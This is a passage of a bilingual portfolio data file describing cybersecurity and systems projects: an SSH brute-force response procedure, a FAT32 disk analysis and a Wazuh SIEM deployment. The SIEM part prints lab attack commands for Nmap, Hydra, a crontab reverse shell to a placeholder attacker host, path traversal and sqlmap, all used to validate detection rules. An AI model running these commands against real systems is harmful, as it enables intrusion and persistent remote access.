              <ul className="list-disc list-inside mb-3 ml-4">
                <li>SIEM</li>
                <li>Logs firewall</li>
                <li>Honeypot</li>
                <li>IDS (Système de Détection d'Intrusion)</li>
              </ul>
              <p className="font-semibold mb-2">Informations à Collecter :</p>
              <div className="bg-[#111218] shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] p-3 rounded">
                <ul className="space-y-1 text-sm">
                  <li><code>src_ip</code> : origine des tentatives</li>
                  <li><code>user</code> : compte ciblé</li>
                  <li><code>timestamp</code> : fenêtre temporelle</li>
                  <li><code>hostname</code> : machine attaquée</li>
                  <li><code>number_of_failures</code> : nombre d'échecs</li>
                  <li><code>success</code> : y a-t-il eu une connexion réussie ?</li>
                </ul>
              </div>

              <h3 className="text-xl font-semibold mb-2">2. Vérification </h3>
              <p className="font-semibold mb-2">Questions à se Poser :</p>
              <ul className="list-disc list-inside mb-3 ml-4 space-y-1">
                <li>Est-ce une attaque réelle ?</li>
                <li>L'IP est-elle externe et suspecte ?</li>
                <li>Plusieurs échecs en quelques secondes ?</li>
                <li>Y a-t-il eu une connexion réussie ? (Si oui : incident critique)</li>
                <li>Le compte ciblé est-il légitime ? Admin ? Compte de service ?</li>
              </ul>
              <p className="font-semibold mb-2">Commandes Utiles (Linux victime) :</p>
              <div className="bg-gray-900 text-green-400 p-3 rounded font-mono text-sm space-y-1">
                <div><code>sudo tail -n 50 /var/log/auth.log</code></div>
                <div><code>sudo grep "Failed password" /var/log/auth.log | tail -n 20</code></div>
                <div><code>sudo grep "Accepted password" /var/log/auth.log | tail -n 20</code></div>
              </div>

              <h3 className="text-xl font-semibold mb-2">3. Contexte </h3>
              <p className="font-semibold mb-2">Éléments à Ajouter :</p>
              <ul className="list-disc list-inside mb-3 ml-4 space-y-1">
                <li>L'IP est-elle connue/reconnue ?</li>
                <li>Est-ce une IP publique ?</li>
                <li>Est-ce une IP interne (VPN) ?</li>
                <li>Le compte est-il protégé par MFA ?</li>
              </ul>
              <p className="font-semibold mb-2">Recherche IP :</p>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Utiliser un service de réputation IP</li>
                <li>Consulter des flux de Threat Intelligence</li>
              </ul>

              <h3 className="text-xl font-semibold mb-2">4. Confinement</h3>
              <p className="font-semibold mb-2">Scénarios Possibles :</p>
              
              <div className="mb-3">
                <p className="font-semibold text-sm mb-1">Si l'attaque provient d'une IP externe :</p>
                <p className="text-sm mb-1">Bloquer l'IP au niveau firewall/iptables</p>
                <div className="bg-gray-900 text-green-400 p-2 rounded font-mono text-xs">
                  <code>sudo iptables -A INPUT -s &lt;IP&gt; -j DROP</code>
                </div>


              <div className="mb-3">
                <p className="font-semibold text-sm mb-1">Si l'attaque cible un compte spécifique :</p>
                <p className="text-sm mb-1">Verrouiller le compte (temporairement)</p>
                <div className="bg-gray-900 text-green-400 p-2 rounded font-mono text-xs">
                  <code>sudo usermod -L testuser</code>
                </div>
              </div>

              <div>
                <p className="font-semibold text-sm mb-1">Si plusieurs IPs attaquent :</p>
                <ul className="list-disc list-inside text-sm ml-4">
                  <li>Activer Fail2Ban</li>
                  <li>Durcir la configuration SSH</li>
                </ul>
              </div>
            </div>

              <h3 className="text-xl font-semibold mb-2">5. Éradication (Suppression de la Menace)</h3>
              <p className="font-semibold mb-2">Actions Recommandées :</p>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Vérifier si une intrusion a eu lieu</li>
                <li>S'assurer que l'attaquant n'a pas créé de backdoor</li>
                <li>Examiner <code className="bg-gray-700 px-2 py-1 rounded text-sm">/etc/ssh/sshd_config</code></li>
              </ul>

              <h3 className="text-xl font-semibold mb-2">6. Remédiation</h3>
              <p className="font-semibold mb-2">Mesures à Appliquer :</p>
              
              <div className="mb-3">
                <p className="font-semibold text-sm mb-1">Désactiver l'authentification par mot de passe, passer aux clés SSH :</p>
                <div className="bg-gray-900 text-green-400 p-2 my-2 rounded font-mono text-xs space-y-1">
                  <div><code>sudo nano /etc/ssh/sshd_config</code></div>
                  <div><code># PasswordAuthentication no</code></div>
                  <div><code>sudo systemctl restart ssh</code></div>
                </div>


              <div>
                <p className="font-semibold text-sm mb-1">Limiter l'accès SSH :</p>
                <ul className="list-disc list-inside text-sm ml-4">
                  <li>Autoriser seulement certaines IPs</li>
                  <li>Mettre en place un VPN obligatoire</li>
                </ul>
              </div>
            </div>

              <h3 className="text-xl font-semibold mb-2">7. Reporting </h3>
              <p className="font-semibold mb-2">Rapport à Produire :</p>
              <ul className="list-disc list-inside ml-4 space-y-1">
                <li>Date/heure de l'attaque</li>
                <li>IP source</li>
                <li>Compte ciblé</li>
                <li>Nombre d'échecs</li>
                <li>Actions de confinement appliquées</li>
                <li>Mesures de remédiation</li>
              </ul>
              <div className="border-l-4 border-green-400 p-3 rounded shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] bg-[#111218] mt-3">
                <p className="text-sm font-semibold mb-1">Conclusion :</p>
                <p className="text-sm ">
                  L'attaque a été détectée par la règle SSH brute force. Les tentatives ont été bloquées et le service SSH a été durci. 
                  Aucun accès réussi n'a été constaté.
                </p>
              </div>
            </div>

        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Compétences Acquises</h2>
          <p className="mb-3">
            Ce projet a fourni une expérience pratique avec le workflow complet de réponse à incident d'une équipe Blue Team. 
            J'ai appris à identifier des modèles d'attaque par l'analyse de logs, créer des règles de détection efficaces en utilisant des frameworks standards de l'industrie (Sigma, MITRE ATT&CK), 
            et documenter des procédures de réponse complètes.
          </p>
          <p>
            L'exercice a renforcé l'importance de l'analyse comportementale plutôt que de simples indicateurs, et a démontré comment des procédures appropriées de détection, 
            de confinement et de remédiation peuvent efficacement atténuer les menaces de sécurité.
          </p>
        </section>
      </>
    ),
  },
}, 
{
  "title": {
    "en": "Disk Partitioning and FAT32 Filesystem Analysis",
    "fr": "Analyse du Partitionnement Disque et du Système de Fichiers FAT32"
  },
  "category": {
    "en": "Systems / Low-Level Programming",
    "fr": "Systèmes / Programmation Bas Niveau"
  },
  "shortDescription": {
    "en": "Educational project performing low-level analysis of disk partitioning and FAT32 filesystem using C, exploring MBR, boot sector, clusters, and root directory traversal.",
    "fr": "Projet pédagogique d'analyse bas niveau du partitionnement disque et du système de fichiers FAT32 en C, explorant le MBR, le secteur de boot, les clusters et le parcours du répertoire racine."
  },
  "longDescription": {
    "en": "This project demonstrates hands-on low-level analysis of disk partitioning and the FAT32 filesystem. By accessing a storage device at the binary level, I read and interpreted the Master Boot Record (MBR), identified FAT32 partitions, parsed boot sector data, and explored the root directory structure. The project reinforced understanding of cluster addressing, directory entries, metadata extraction, and recursive traversal without relying on high-level OS tools. It highlights how files are stored on disk and the connection between theoretical filesystem concepts and practical implementation.",
    "fr": "Ce projet montre une analyse pratique bas niveau du partitionnement disque et du système de fichiers FAT32. En accédant à un périphérique de stockage au niveau binaire, j'ai lu et interprété le Master Boot Record (MBR), identifié les partitions FAT32, analysé le secteur de boot et exploré la structure du répertoire racine. Le projet a renforcé la compréhension de l'adressage par clusters, des entrées de répertoire, de l'extraction des métadonnées et du parcours récursif, sans utiliser d'outils système de haut niveau. Il montre comment les fichiers sont réellement stockés sur le disque et relie théorie et implémentation concrète."
  },
  "techs": ["C", "Linux", "MBR", "FAT32", "Low-Level Programming", "Filesystem Analysis", "Binary I/O"],
  "slug": "mbr-fat32-analysis",
  "content": {
    "en": (
      <>
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Project Context</h2>
          <p className="mb-3">
            This academic lab project aimed to understand how disks are partitioned and how the FAT32 filesystem works internally.
            The analysis was performed in C, using direct binary access to the storage device to explore its structures without relying on high-level OS commands.
          </p>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 1: Reading the Master Boot Record (MBR)</h2>
          <p className="mb-3">
            The program reads the first 512 bytes of the disk, corresponding to the MBR. 
            The MBR contains the bootloader code, the partition table (4 entries), and a signature (0xAA55).
          </p>
          <p className="mb-3">
            Each partition entry is parsed to extract:
          </p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>Partition type</li>
            <li>Start LBA address</li>
            <li>Partition size</li>
          </ul>
          <p className="mb-3">Only partitions of type FAT32 are further analyzed.</p>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 2: FAT32 Boot Sector Analysis</h2>
          <p className="mb-3">
            Once a FAT32 partition is detected, its boot sector is read. This sector contains essential filesystem parameters:
          </p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>Bytes per sector</li>
            <li>Sectors per cluster</li>
            <li>Reserved sectors</li>
            <li>FAT size</li>
            <li>Root cluster number</li>
          </ul>
          <p className="mb-3">
            These values are crucial to calculate the actual LBA addresses of data clusters and directories.
          </p>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 3: Cluster Addressing and Root Directory</h2>
          <p className="mb-3">
            Using boot sector information, the program calculates:
          </p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>LBA of the data area</li>
            <li>LBA of the root cluster</li>
            <li>Mapping of cluster numbers to disk addresses</li>
          </ul>
          <p className="mb-3">
            The root directory is read cluster by cluster. Each 32-byte entry is interpreted to extract:
          </p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>File or directory name (short 8.3 and long LFN)</li>
            <li>File type</li>
            <li>File size</li>
            <li>First cluster number</li>
            <li>LBA address on disk</li>
          </ul>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 4: Recursive Directory Traversal</h2>
          <p className="mb-3">
            Detected directories are stored for later exploration. The program recursively parses subdirectories, allowing navigation of the full FAT32 hierarchy.
            This demonstrates a concrete understanding of filesystem structure, cluster linking, and metadata management.
          </p>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Learning Outcomes</h2>
          <p className="mb-3">
            - Hands-on understanding of disk partitioning and MBR structure.<br/>
            - Detailed knowledge of FAT32 filesystem layout and cluster addressing.<br/>
            - Ability to extract file metadata and traverse directories programmatically.<br/>
            - Experience with binary file I/O and memory structure manipulation in C.<br/>
            - Bridging theory and practical implementation of low-level systems programming.
          </p>
        </section>
      </>
    ),
    "fr": (
      <>
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Contexte du Projet</h2>
          <p className="mb-3">
            Ce TP académique avait pour objectif de comprendre le partitionnement des disques et le fonctionnement interne du système de fichiers FAT32.
            L'analyse a été réalisée en C, en accédant directement au périphérique de stockage pour explorer ses structures sans utiliser d'outils système de haut niveau.
          </p>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 1 : Lecture du Master Boot Record (MBR)</h2>
          <p className="mb-3">
            Le programme lit les 512 premiers octets du disque, correspondant au MBR.
            Le MBR contient le code d'amorçage, la table de 4 partitions et une signature (0xAA55).
          </p>
          <p className="mb-3">Chaque entrée de partition est analysée pour extraire :</p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>Type de partition</li>
            <li>Adresse LBA de début</li>
            <li>Taille de la partition</li>
          </ul>
          <p className="mb-3">Seules les partitions de type FAT32 sont analysées plus en détail.</p>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 2 : Analyse du Secteur de Boot FAT32</h2>
          <p className="mb-3">
            Une fois la partition FAT32 détectée, le secteur de boot est lu. Il contient les paramètres fondamentaux du système de fichiers :
          </p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>Taille d'un secteur</li>
            <li>Nombre de secteurs par cluster</li>
            <li>Nombre de secteurs réservés</li>
            <li>Taille de la FAT</li>
            <li>Numéro du cluster racine</li>
          </ul>
          <p className="mb-3">
            Ces informations sont indispensables pour calculer les adresses LBA réelles des clusters de données et des répertoires.
          </p>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 3 : Adressage des Clusters et Répertoire Racine</h2>
          <p className="mb-3">
            À partir du secteur de boot, le programme calcule :
          </p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>LBA du début de la zone de données</li>
            <li>LBA du cluster racine</li>
            <li>Correspondance entre numéro de cluster et adresse disque réelle</li>
          </ul>
          <p className="mb-3">
            Le répertoire racine est ensuite lu cluster par cluster. Chaque entrée de 32 octets est interprétée pour extraire :
          </p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>Nom du fichier ou répertoire (nom court 8.3 et nom long LFN)</li>
            <li>Type (fichier ou répertoire)</li>
            <li>Taille du fichier</li>
            <li>Numéro du premier cluster</li>
            <li>Adresse LBA correspondante</li>
          </ul>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Phase 4 : Parcours Récursif des Répertoires</h2>
          <p className="mb-3">
            Les répertoires détectés sont stockés pour exploration ultérieure. Le programme parcourt récursivement les sous-répertoires, permettant une navigation complète de l'arborescence FAT32.
            Cela montre une compréhension concrète de la structure du système de fichiers, des liens de clusters et de la gestion des métadonnées.
          </p>
        </section>

        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Compétences Acquises</h2>
          <p className="mb-3">
            - Compréhension pratique du partitionnement disque et de la structure MBR.<br/>
            - Connaissance détaillée de la disposition FAT32 et de l'adressage par clusters.<br/>
            - Extraction de métadonnées et parcours programmatique des répertoires.<br/>
            - Expérience en lecture binaire et manipulation de structures mémoire en C.<br/>
            - Capacité à relier théorie des systèmes de fichiers et implémentation concrète.
          </p>
        </section>
      </>
    )
  },
  github:"https://github.com/anxxooo/Fat32-file-system.git"
},

{
  title: {
    en: "SIEM Monitoring & Threat Detection for Hybrid Linux/Windows Infrastructure",
    fr: "Surveillance et détection SIEM pour infrastructure Linux/Windows",
  },
  category: {
    en: "Cybersecurity / SOC",
    fr: "Cybersécurité / SOC",
  },
  shortDescription: {
    en: "Deploying Wazuh as a central SIEM over a hybrid Linux/Windows infrastructure, with CIS hardening, custom multi-stage detection rules, raw-log investigation via Filebeat, and validation through a full attack scenario.",
    fr: "Déploiement de Wazuh comme SIEM central sur une infrastructure Linux/Windows, avec durcissement CIS, règles de détection personnalisées multi-étapes, investigation des logs bruts via Filebeat, et validation par un scénario d'attaque complet.",
  },
  longDescription: {
    en: `The goal was to build a continuous monitoring and detection solution for a heterogeneous Linux/Windows infrastructure based on the open-source SIEM Wazuh.
Hardened the central server using CIS Benchmarks (Lynis), connected Wazuh agents on Ubuntu and Windows machines, wrote a set of custom detection rules leveraging frequency and event correlation to catch multi-stage attacks, and built a dedicated investigation layer using multiple Filebeat instances feeding parsed logs into OpenSearch dashboards (SSH, UFW, sudo, Apache, MySQL). The whole solution was validated through an eight-step attack scenario reproduced from a Kali Linux attacker, from network reconnaissance to SQL injection.`,
    fr: `L'objectif était de construire une solution de surveillance et de détection continue pour une infrastructure hétérogène Linux/Windows, basée sur le SIEM open source Wazuh.
Durci le serveur central via les CIS Benchmarks (Lynis), connecté des agents Wazuh sur des machines Ubuntu et Windows, développé un ensemble de règles de détection personnalisées exploitant la fréquence et la corrélation d'événements pour détecter des attaques multi-étapes, et mis en place une couche d'investigation dédiée via plusieurs instances Filebeat alimentant des tableaux de bord OpenSearch (SSH, UFW, sudo, Apache, MySQL). L'ensemble a été validé par un scénario d'attaque en huit étapes reproduit depuis une machine attaquante Kali Linux, de la reconnaissance réseau à l'injection SQL.`,
  },
  techs: [
    "Wazuh",
    "SIEM",
    "Linux",
    "Windows",
    "Filebeat",
    "OpenSearch",
    "CIS Benchmarks",
    "Lynis",
    "auditd",
    "FIM",
    "MITRE ATT&CK",
    "VMware",
    "SOC",
  ],
  slug: "wazuh-siem-monitoring",
  content: {
    en: (
      <>
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Project Context</h2>
          <p className="mb-3">
            This project addresses a concrete operational problem:
            a large infrastructure generates thousands of system events per machine, far beyond what a security team can monitor manually.
            The objective was to centralize detection and investigation across a heterogeneous Linux/Windows environment using Wazuh as the SIEM core.
          </p>
          <div className="border-l-4 border-green-400 p-4 rounded shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] bg-[#111218]">
            <p className="text-sm font-semibold">Environment</p>
            <p className="text-sm text-gray-300">
              Four virtual machines under VMware Workstation: a hardened Wazuh server (Manager + Indexer + Dashboard),
              an Ubuntu agent, a Windows agent, and a Kali Linux attacker used to safely simulate attacks in an isolated lab.
            </p>
          </div>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Central Server Hardening — CIS Benchmarks</h2>
          <p className="mb-3">
            Before deploying any component, the Wazuh server was hardened following CIS Benchmarks recommendations, audited with Lynis.
            Corrective measures included disabling unnecessary services, strengthening access policies, enabling a malware scanner and applying strict permissions on system files.
          </p>
          <p className="mb-3">
            The hardening index rose from <strong>61/100</strong> to <strong>91/100</strong>, the malware scanner became active, and the number of covered tests increased from 244 to 260.
          </p>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Wazuh Deployment</h2>
          <p className="mb-3">
            The Wazuh server (Ubuntu 22.04 LTS) bundles the three central components: the <strong>Manager</strong> (event decoding, normalization and rule engine),
            the <strong>Indexer</strong> (OpenSearch-based storage and indexing) and the <strong>OpenSearch Dashboard</strong> (visualization).
          </p>
          <p className="mb-3">Two agents were connected and confirmed as <em>Active</em>:</p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li><strong>ubuntu-agent</strong> — Ubuntu 22.04 with a Wazuh agent and an Apache server for web-attack simulation.</li>
            <li><strong>windows-agent</strong> — Windows 10 with a Wazuh agent, XAMPP and DVWA for web-attack simulation.</li>
          </ul>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Investigation Layer — Filebeat & OpenSearch</h2>
          <p className="mb-3">
            Normalized Wazuh events keep only the fields needed for alerting, so they don't provide a complete history of system activity.
            To enable deep investigation, we deployed multiple Filebeat instances, each dedicated to a specific log type.
          </p>
          <p className="mb-3">On <strong>ubuntu-agent</strong>, four Filebeat instances were configured:</p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li><strong>SSH</strong> — authentication logs (<code>/var/log/auth.log</code>): successful and failed logins, source IP, username.</li>
            <li><strong>UFW</strong> — firewall logs: every blocked or allowed connection.</li>
            <li><strong>Apache Access</strong> — HTTP requests: source IP, requested page, response code.</li>
            <li><strong>Sudo</strong> — commands executed with elevated privileges.</li>
          </ul>
          <p className="mb-3">
            On ubuntu-agent, raw logs are sent to the Manager where a dedicated ingestion pipeline (parser) extracts and structures the useful fields before indexing into a dedicated index (e.g. <code>ssh-logs</code>).
            On <strong>windows-agent</strong>, a single Filebeat instance with an embedded parser handles Apache access, Apache error and MySQL logs locally before sending them directly to the Indexer.
          </p>
          <p className="mb-3">
            Each log type gets its own OpenSearch dashboard, letting an analyst filter by any parsed field (IP, user, port, HTTP code...) or by time range to precisely reconstruct an incident timeline.
          </p>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Custom Detection Rules</h2>
          <p className="mb-3">
            Wazuh's default rules can't correlate events or detect suspicious sequences spread over time.
            We developed our own ruleset integrated into the Manager, leveraging two advanced mechanisms — <strong>frequency</strong> and <strong>correlation</strong> — to catch multi-stage attacks.
            For sensitive system events (critical file modifications, privileged commands), the Linux <strong>auditd</strong> module was configured to capture the relevant system calls and feed them to the detection logic.
          </p>

          <h3 className="text-xl font-semibold mb-2 mt-6">Representative rules</h3>
          <div className="overflow-x-auto">
            <table className="w-full text-sm border border-gray-700">
              <thead className="bg-[#111218]">
                <tr>
                  <th className="text-left p-2 border border-gray-700">Rule ID</th>
                  <th className="text-left p-2 border border-gray-700">Description</th>
                  <th className="text-left p-2 border border-gray-700">Level</th>
                  <th className="text-left p-2 border border-gray-700">Category</th>
                </tr>
              </thead>
              <tbody>
                <tr><td className="p-2 border border-gray-700">100002</td><td className="p-2 border border-gray-700">SSH brute force — 8+ attempts in 2 min</td><td className="p-2 border border-gray-700">10</td><td className="p-2 border border-gray-700">Brute force</td></tr>
                <tr><td className="p-2 border border-gray-700">100004</td><td className="p-2 border border-gray-700">Account compromise — success after brute force</td><td className="p-2 border border-gray-700">14</td><td className="p-2 border border-gray-700">Compromise</td></tr>
                <tr><td className="p-2 border border-gray-700">100102</td><td className="p-2 border border-gray-700">Root crontab modified — critical persistence</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Persistence</td></tr>
                <tr><td className="p-2 border border-gray-700">100107</td><td className="p-2 border border-gray-700">New user account created</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Account manipulation</td></tr>
                <tr><td className="p-2 border border-gray-700">100401</td><td className="p-2 border border-gray-700">Sensitive file permissions changed</td><td className="p-2 border border-gray-700">11</td><td className="p-2 border border-gray-700">Sensitive files</td></tr>
                <tr><td className="p-2 border border-gray-700">100403</td><td className="p-2 border border-gray-700">Several critical files modified within 2 min</td><td className="p-2 border border-gray-700">15</td><td className="p-2 border border-gray-700">Correlation</td></tr>
                <tr><td className="p-2 border border-gray-700">100501</td><td className="p-2 border border-gray-700">Port scan detected — multiple blocked connections</td><td className="p-2 border border-gray-700">10</td><td className="p-2 border border-gray-700">Reconnaissance</td></tr>
                <tr><td className="p-2 border border-gray-700">100600</td><td className="p-2 border border-gray-700">RCE attempt — system command / sensitive file in URL</td><td className="p-2 border border-gray-700">12</td><td className="p-2 border border-gray-700">Web / RCE</td></tr>
                <tr><td className="p-2 border border-gray-700">100611</td><td className="p-2 border border-gray-700">SQL injection possibly successful — HTTP 200</td><td className="p-2 border border-gray-700">14</td><td className="p-2 border border-gray-700">SQL injection</td></tr>
              </tbody>
            </table>
          </div>
          <p className="text-sm text-gray-400 mt-2">Subset of the full ruleset (30+ rules across authentication, privilege escalation, persistence, file integrity, reconnaissance and web attacks).</p>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Validation — Attack Scenario</h2>
          <p className="mb-3">
            The solution was validated by reproducing a progressive attack from Kali Linux, mimicking an attacker compromising a corporate infrastructure. Each step generated the expected alert at the correct severity level.
          </p>
          <p className="font-semibold mb-2">Phase 1 — ubuntu-agent:</p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>Reconnaissance: port scan with Nmap (<code>-sS -sV</code>) → UFW blocks correlated, rule 100501.</li>
            <li>Intrusion: SSH brute force with Hydra → 8+ failures in 2 min, rule 100002.</li>
            <li>Account compromise: successful SSH login correlated with prior failures, rule 100004.</li>
            <li>Privilege escalation: <code>useradd</code> / <code>usermod -aG sudo</code> → rules 100400, 100402, 100107.</li>
            <li>Persistence: reverse shell via crontab → rule 100101.</li>
            <li>System tampering: <code>chmod 777 /etc/shadow</code> → FIM, rule 100401.</li>
            <li>Web attack: path traversal &amp; RCE attempt on Apache → rule 100600.</li>
          </ul>
          <p className="font-semibold mb-2">Phase 2 — windows-agent:</p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li>SQL injection on DVWA with sqlmap → rules 100612 then 100611 (HTTP 200).</li>
          </ul>
          <div className="bg-gray-900 text-green-400 p-4 rounded font-mono text-sm overflow-x-auto mb-4">
            <pre>{`# Reconnaissance
nmap -sS -sV <target>
 
# SSH brute force
hydra -L users.txt -P pwds.txt <target> ssh -t 5
 
# Persistence (reverse shell via crontab)
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/<attacker>/4444 0>&1") | crontab -
 
# Web RCE attempt
curl "http://<target>/index.php?file=../../../etc/passwd"
 
# SQL injection
sqlmap -u "http://<target>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=3`}</pre>
          </div>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Outcomes</h2>
          <p className="mb-3">
            All eight attack steps — from network reconnaissance to SQL injection — were detected with the correct alert and severity level.
            The two-layer architecture (detection via custom rules, investigation via Filebeat-fed OpenSearch dashboards) proved coherent and complementary.
          </p>
          <p>
            The project gave hands-on experience deploying and tuning a SIEM, hardening systems against CIS Benchmarks, writing correlation-based detection rules mapped to MITRE ATT&amp;CK, and running a structured Blue Team validation workflow.
          </p>
        </section>
      </>
    ),
    fr: (
      <>
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Contexte du Projet</h2>
          <p className="mb-3">
            Réalisé au sein du département sécurité informatique d'Ooredoo Algérie, ce projet répond à une problématique opérationnelle concrète :
            une grande infrastructure génère des milliers d'événements système par machine, bien au-delà de ce qu'une équipe de sécurité peut surveiller manuellement.
            L'objectif était de centraliser la détection et l'investigation sur un environnement hétérogène Linux/Windows en utilisant Wazuh comme cœur SIEM.
          </p>
          <div className="border-l-4 border-green-400 p-4 rounded shadow-[inset_0_1px_0_rgba(255,255,255,0.05),0_10px_25px_rgba(0,0,0,0.8)] bg-[#111218]">
            <p className="text-sm font-semibold">Environnement</p>
            <p className="text-sm text-gray-300">
              Quatre machines virtuelles sous VMware Workstation : un serveur Wazuh durci (Manager + Indexer + Dashboard),
              un agent Ubuntu, un agent Windows, et une machine attaquante Kali Linux pour simuler les attaques dans un lab isolé.
            </p>
          </div>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Durcissement du Serveur Central — CIS Benchmarks</h2>
          <p className="mb-3">
            Avant tout déploiement, le serveur Wazuh a été durci en suivant les recommandations CIS Benchmarks, audité avec Lynis.
            Les mesures correctives ont inclus la désactivation des services inutiles, le renforcement des politiques d'accès, l'activation d'un scanner de malware et l'application de permissions strictes sur les fichiers système.
          </p>
          <p className="mb-3">
            Le hardening index est passé de <strong>61/100</strong> à <strong>91/100</strong>, le scanner de malware est devenu actif, et le nombre de tests couverts est passé de 244 à 260.
          </p>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Déploiement de Wazuh</h2>
          <p className="mb-3">
            Le serveur Wazuh (Ubuntu 22.04 LTS) regroupe les trois composants centraux : le <strong>Manager</strong> (décodage, normalisation des événements et moteur de règles),
            l'<strong>Indexer</strong> (stockage et indexation basés sur OpenSearch) et le <strong>tableau de bord OpenSearch</strong> (visualisation).
          </p>
          <p className="mb-3">Deux agents ont été connectés et confirmés <em>Active</em> :</p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li><strong>ubuntu-agent</strong> — Ubuntu 22.04 avec un agent Wazuh et un serveur Apache pour la simulation d'attaques web.</li>
            <li><strong>windows-agent</strong> — Windows 10 avec un agent Wazuh, XAMPP et DVWA pour la simulation d'attaques web.</li>
          </ul>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Couche d'Investigation — Filebeat & OpenSearch</h2>
          <p className="mb-3">
            Les événements normalisés par Wazuh ne conservent que les champs nécessaires à la génération d'alertes — ils ne fournissent donc pas un historique complet de l'activité système.
            Pour permettre une investigation approfondie, nous avons déployé plusieurs instances Filebeat, chacune dédiée à un type de logs spécifique.
          </p>
          <p className="mb-3">Sur <strong>ubuntu-agent</strong>, quatre instances Filebeat ont été configurées :</p>
          <ul className="list-disc list-inside mb-4 ml-4 space-y-1">
            <li><strong>SSH</strong> — logs d'authentification (<code>/var/log/auth.log</code>) : connexions réussies et échouées, IP source, nom d'utilisateur.</li>
            <li><strong>UFW</strong> — logs du pare-feu : toutes les connexions bloquées ou autorisées.</li>
            <li><strong>Apache Access</strong> — requêtes HTTP : IP source, page demandée, code de réponse.</li>
            <li><strong>Sudo</strong> — commandes exécutées avec des privilèges élevés.</li>
          </ul>
          <p className="mb-3">
            Sur ubuntu-agent, les logs bruts sont envoyés au Manager où un pipeline d'ingestion dédié (parser) extrait et structure les champs utiles avant indexation dans un index dédié (ex. <code>ssh-logs</code>).
            Sur <strong>windows-agent</strong>, une seule instance Filebeat avec parser intégré traite localement les logs Apache access, Apache error et MySQL avant envoi direct à l'Indexer.
          </p>
          <p className="mb-3">
            Chaque type de logs dispose de son propre tableau de bord OpenSearch, permettant à l'analyste de filtrer par n'importe quel champ parsé (IP, user, port, code HTTP...) ou par plage temporelle pour reconstituer précisément la chronologie d'un incident.
          </p>
        </section>
 
        <section className="mb-8">
          <h2 className="text-2xl font-semibold mb-3 text-green-400">Règles de Détection Personnalisées</h2>
          <p className="mb-3">
            Les règles par défaut de Wazuh ne permettent pas de corréler des événements ni de détecter des séquences suspectes étalées dans le temps.
            Nous avons développé notre propre ensemble de règles intégrées au Manager, exploitant deux mécanismes avancés — la <strong>fréquence</strong> et la <strong>corrélation</strong> — pour détecter des attaques multi-étapes.
            Pour les événements système sensibles (modifications de fichiers critiques, commandes privilégiées), le module Linux <strong>auditd</strong> a été configuré pour capturer les appels système concernés et les soumettre à la logique de détection.
          </p>

          <h3 className="text-xl font-semibold mb-2 mt-6">Règles représentatives</h3>
          <div className="overflow-x-auto">
            <table className="w-full text-sm border border-gray-700">
              <thead className="bg-[#111218]">
                <tr>
                  <th className="text-left p-2 border border-gray-700">Rule ID</th>
                  <th className="text-left p-2 border border-gray-700">Description</th>
                  <th className="text-left p-2 border border-gray-700">Niveau</th>
                  <th className="text-left p-2 border border-gray-700">Catégorie</th>
                </tr>
              </thead>
              <tbody>
